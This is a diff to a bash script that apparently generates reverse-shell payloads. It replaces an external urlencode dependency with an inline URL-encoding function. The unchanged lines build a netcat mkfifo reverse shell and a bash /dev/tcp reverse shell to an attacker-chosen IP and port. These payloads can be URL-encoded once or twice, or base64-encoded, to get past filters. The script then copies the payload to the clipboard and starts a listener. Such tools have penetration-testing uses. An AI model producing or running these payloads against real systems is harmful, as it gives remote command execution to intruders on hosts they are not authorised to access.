@@ -66,16 +66,19 @@ exit
 fi
 
 
-urlencode=`which urlencode`
 
-if [ "$?" == 1 ]
-then
-      header
-                redprint "$0 depends on urlencode and cannot continue.
-Install on Debian: sudo apt install gridsite-clients 
-"
-exit
-fi
+urlencodeme() {
+ 
+    local length="${#1}"
+    for (( i = 0; i < length; i++ )); do
+        local c="${1:i:1}"
+        case $c in
+            [a-zA-Z0-9.~_-]) printf "$c" ;;
+            *) printf '%%%02X' "'$c"
+        esac
+    done
+}
+
 
 #Find IP
 int=$(route | grep '^default' | grep -o '[^ ]*$')
@@ -143,11 +146,11 @@ header
 rev="rm /tmp/meh;mkfifo /tmp/meh; nc $IP $PORT 0</tmp/meh | /bin/sh >/tmp/meh 2>&1; rm /tmp/meh"
 if [[ $1 == "url" ]] 
 then
-    rev=$($urlencode $rev)
+    rev=$(urlencodeme $rev)
 elif [[ $1 == "urlx2" ]] 
 then
-    rev=$($urlencode $rev)
-    rev=$($urlencode $rev)
+    rev=$(urlencodeme $rev)
+    rev=$(urlencodeme $rev)
 
 elif [[ $1 == "base64" ]] 
 then
@@ -165,11 +168,11 @@ rev="sh -i >& /dev/tcp/$IP/$PORT 0>&1"
 
 if [[ $1 == "url" ]] 
 then
-    rev=$($urlencode $rev)
+    rev=$(urlencodeme $rev)
 elif [[ $1 == "urlx2" ]] 
 then
-    rev=$($urlencode $rev)
-    rev=$($urlencode $rev)
+    rev=$(urlencodeme $rev)
+    rev=$(urlencodeme $rev)
 
 elif [[ $1 == "base64" ]] 
 then
@@ -202,13 +205,13 @@ if [[ $2 == "url" ]]
 
 then
 
-    rev=$($urlencode $rev)
+    rev=$(urlencodeme $rev)
 
 elif [[ $2 == "urlx2" ]] 
 
 then
-    rev=$($urlencode $rev)
-    rev=$($urlencode $rev)
+    rev=$(urlencodeme $rev)
+    rev=$(urlencodeme $rev)
 fi
 echo -n $rev | xclip -sel c
 listen
